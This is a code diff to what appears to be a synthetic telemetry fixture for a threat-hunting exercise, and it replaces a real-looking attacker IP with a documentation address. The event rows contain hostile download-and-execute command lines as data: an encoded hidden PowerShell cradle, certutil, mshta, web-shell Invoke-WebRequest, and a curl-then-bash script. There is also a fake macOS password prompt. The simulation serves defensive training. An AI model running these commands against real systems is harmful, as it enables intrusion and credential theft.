@@ -118,7 +118,7 @@
     return r;
   }
 
-  const C2 = '185.220.101.45';
+  const C2 = '192.0.2.45';
   const IOC_SHA = BIN['update.exe'][3];
   const HUD = 'ACME\\s.hudson', PAM = 'ACME\\p.beesly', JIM = 'ACME\\j.halpert', ADM = 'ACME\\administrator', SYS = 'NT AUTHORITY\\SYSTEM', DWT = 'ACME\\d.schrute', POOL = 'IIS APPPOOL\\DefaultAppPool';
   const PS_ENC = 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AYQAnACkA';
@@ -134,7 +134,7 @@
     proc('2026-10-26 09:12:09', 'WS-FIN-042', HUD, 'powershell.exe', 'cmd.exe', 'cmd.exe /c whoami /all', 'OUTLOOK.EXE', { actorCmd: PS_ENC }),
     proc('2026-10-26 09:12:11', 'WS-FIN-042', HUD, 'cmd.exe', 'whoami.exe', 'whoami /all', 'OUTLOOK.EXE', { actorCmd: 'cmd.exe /c whoami /all' }),
     net('2026-10-26 09:12:30', 'WS-FIN-042', HUD, 'powershell.exe', C2, 443, C2, 'DE', 307200, 4096, { causality: 'OUTLOOK.EXE', actorCmd: PS_ENC }),
-    proc('2026-10-26 09:14:30', 'WS-FIN-042', HUD, 'powershell.exe', 'certutil.exe', 'certutil.exe -urlcache -split -f http://185.220.101.45/update.exe C:\\Users\\s.hudson\\AppData\\Local\\Temp\\update.exe', 'OUTLOOK.EXE', { actorCmd: PS_ENC }),
+    proc('2026-10-26 09:14:30', 'WS-FIN-042', HUD, 'powershell.exe', 'certutil.exe', 'certutil.exe -urlcache -split -f http://192.0.2.45/update.exe C:\\Users\\s.hudson\\AppData\\Local\\Temp\\update.exe', 'OUTLOOK.EXE', { actorCmd: PS_ENC }),
     net('2026-10-26 09:14:31', 'WS-FIN-042', HUD, 'certutil.exe', C2, 80, C2, 'DE', 1228, 2457600, { causality: 'OUTLOOK.EXE' }),
     file('2026-10-26 09:14:35', 'WS-FIN-042', HUD, 'certutil.exe', 'FILE_CREATE_NEW', 'C:\\Users\\s.hudson\\AppData\\Local\\Temp\\update.exe', 2457600, IOC_SHA, { causality: 'OUTLOOK.EXE' }),
     file('2026-10-26 09:14:36', 'WS-FIN-042', HUD, 'certutil.exe', 'FILE_WRITE', 'C:\\Users\\s.hudson\\AppData\\Local\\Temp\\update.exe', 2457600, IOC_SHA, { causality: 'OUTLOOK.EXE' }),
@@ -172,7 +172,7 @@
     net('2026-10-25 16:41:00', 'WS-SALES-023', JIM, 'AnyDesk.exe', '185.33.12.5', 443, 'relay-1.anydesk.com', 'DE', 8388608, 2097152, { dns: 'relay-1.anydesk.com', causality: 'explorer.exe' }),
     reg('2026-10-25 16:42:00', 'WS-SALES-023', JIM, 'AnyDesk.exe', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'AnyDesk', '"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe" --silent', { causality: 'explorer.exe' }),
     file('2026-10-26 14:10:00', 'WS-SALES-023', JIM, 'explorer.exe', 'FILE_WRITE', 'E:\\customer_list_export.xlsx', 3200000, null),
-    proc('2026-10-26 16:00:00', 'WS-SALES-023', JIM, 'explorer.exe', 'mshta.exe', 'mshta.exe http://185.220.101.45/a.hta', 'explorer.exe'),
+    proc('2026-10-26 16:00:00', 'WS-SALES-023', JIM, 'explorer.exe', 'mshta.exe', 'mshta.exe http://192.0.2.45/a.hta', 'explorer.exe'),
     net('2026-10-26 16:00:02', 'WS-SALES-023', JIM, 'mshta.exe', C2, 80, C2, 'DE', 980, 61400, { causality: 'explorer.exe' }),
 
     // --- SRV-DC-01: admin uses PsExec (15 and 24 Oct), nightly backup (22 Oct) ---
@@ -186,8 +186,8 @@
     // --- SRV-WEB-02: web shell activity (23 Oct) ---
     proc('2026-10-23 11:11:11', 'SRV-WEB-02', POOL, 'w3wp.exe', 'cmd.exe', 'cmd.exe /c whoami', 'w3wp.exe'),
     proc('2026-10-23 11:11:12', 'SRV-WEB-02', POOL, 'cmd.exe', 'whoami.exe', 'whoami', 'w3wp.exe', { actorCmd: 'cmd.exe /c whoami' }),
-    proc('2026-10-23 11:13:40', 'SRV-WEB-02', POOL, 'w3wp.exe', 'cmd.exe', 'cmd.exe /c "powershell -c Invoke-WebRequest http://185.220.101.45/sh.ps1 -OutFile C:\\inetpub\\wwwroot\\sh.ps1"', 'w3wp.exe'),
-    proc('2026-10-23 11:13:41', 'SRV-WEB-02', POOL, 'cmd.exe', 'powershell.exe', 'powershell -c Invoke-WebRequest http://185.220.101.45/sh.ps1 -OutFile C:\\inetpub\\wwwroot\\sh.ps1', 'w3wp.exe'),
+    proc('2026-10-23 11:13:40', 'SRV-WEB-02', POOL, 'w3wp.exe', 'cmd.exe', 'cmd.exe /c "powershell -c Invoke-WebRequest http://192.0.2.45/sh.ps1 -OutFile C:\\inetpub\\wwwroot\\sh.ps1"', 'w3wp.exe'),
+    proc('2026-10-23 11:13:41', 'SRV-WEB-02', POOL, 'cmd.exe', 'powershell.exe', 'powershell -c Invoke-WebRequest http://192.0.2.45/sh.ps1 -OutFile C:\\inetpub\\wwwroot\\sh.ps1', 'w3wp.exe'),
     net('2026-10-23 11:13:42', 'SRV-WEB-02', POOL, 'powershell.exe', C2, 80, C2, 'DE', 640, 1800, { causality: 'w3wp.exe' }),
     file('2026-10-23 11:14:06', 'SRV-WEB-02', POOL, 'powershell.exe', 'FILE_WRITE', 'C:\\inetpub\\wwwroot\\sh.ps1', 1800, null, { causality: 'w3wp.exe' }),
 
@@ -201,7 +201,7 @@
 
     // --- MAC-DESIGN-03: credential phishing dialog and script download (26 Oct) ---
     proc('2026-10-26 15:30:00', 'MAC-DESIGN-03', 'a.martin', 'launchd', 'osascript', 'osascript -e \'display dialog "Update required" default answer "" with hidden answer\'', 'launchd'),
-    proc('2026-10-26 15:31:00', 'MAC-DESIGN-03', 'a.martin', 'bash', 'curl', 'curl -s https://185.220.101.45/m.sh -o /tmp/m.sh', 'launchd'),
+    proc('2026-10-26 15:31:00', 'MAC-DESIGN-03', 'a.martin', 'bash', 'curl', 'curl -s https://192.0.2.45/m.sh -o /tmp/m.sh', 'launchd'),
     net('2026-10-26 15:31:01', 'MAC-DESIGN-03', 'a.martin', 'curl', C2, 443, C2, 'DE', 512, 912, { causality: 'launchd' }),
     file('2026-10-26 15:31:02', 'MAC-DESIGN-03', 'a.martin', 'curl', 'FILE_CREATE_NEW', '/tmp/m.sh', 912, null, { causality: 'launchd' }),
     proc('2026-10-26 15:31:30', 'MAC-DESIGN-03', 'a.martin', 'bash', 'bash', 'bash /tmp/m.sh', 'launchd'),
@@ -217,12 +217,12 @@
   const WIN_COLUMNS = ['_time', 'host_name', 'event_id', 'event_result', 'event_data', '_product', '_vendor'];
   const win = (time, host, id, result, data) => ({ _time: T(time), host_name: host, event_id: id, event_result: result, event_data: JSON.stringify(data), _product: 'Windows', _vendor: 'Microsoft' });
   const WIN_ROWS = [
-    win('2026-10-24 21:58:02', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '185.220.101.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
-    win('2026-10-24 21:58:05', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '185.220.101.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
-    win('2026-10-24 21:58:09', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '185.220.101.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
-    win('2026-10-24 21:58:14', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '185.220.101.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
-    win('2026-10-24 21:58:20', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '185.220.101.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
-    win('2026-10-24 21:59:41', 'SRV-DC-01', 4624, 'success', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '185.220.101.45', WorkstationName: 'KALI' }),
+    win('2026-10-24 21:58:02', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '192.0.2.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
+    win('2026-10-24 21:58:05', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '192.0.2.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
+    win('2026-10-24 21:58:09', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '192.0.2.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
+    win('2026-10-24 21:58:14', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '192.0.2.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
+    win('2026-10-24 21:58:20', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '192.0.2.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
+    win('2026-10-24 21:59:41', 'SRV-DC-01', 4624, 'success', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '192.0.2.45', WorkstationName: 'KALI' }),
     win('2026-10-24 22:14:55', 'SRV-DC-01', 4624, 'success', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '10', IpAddress: '10.10.30.9', WorkstationName: 'LAPTOP-SEC-09' }),
     win('2026-10-24 22:15:06', 'WS-HR-017', 7045, 'success', { ServiceName: 'PSEXESVC', ImagePath: '%SystemRoot%\\PSEXESVC.exe', ServiceType: 'user mode service', StartType: 'demand start', AccountName: 'LocalSystem' }),
     win('2026-10-24 22:16:01', 'WS-HR-017', 4720, 'success', { TargetUserName: 'backup_svc', TargetDomainName: 'WS-HR-017', SubjectUserName: 'WS-HR-017$', SubjectDomainName: 'ACME' }),
@@ -334,7 +334,7 @@
   };
 
   XQL.GEOIP = {
-    '185.220.101.45': { country: 'DE', city: 'Frankfurt', latlon: '50.11,8.68', continent: 'Europe' },
+    '192.0.2.45': { country: 'DE', city: 'Frankfurt', latlon: '50.11,8.68', continent: 'Europe' },
     '185.33.12.5': { country: 'DE', city: 'Berlin', latlon: '52.52,13.40', continent: 'Europe' },
     '52.96.166.98': { country: 'US', city: 'Redmond', latlon: '47.67,-122.12', continent: 'North America' },
     '142.250.187.206': { country: 'US', city: 'Mountain View', latlon: '37.42,-122.08', continent: 'North America' },
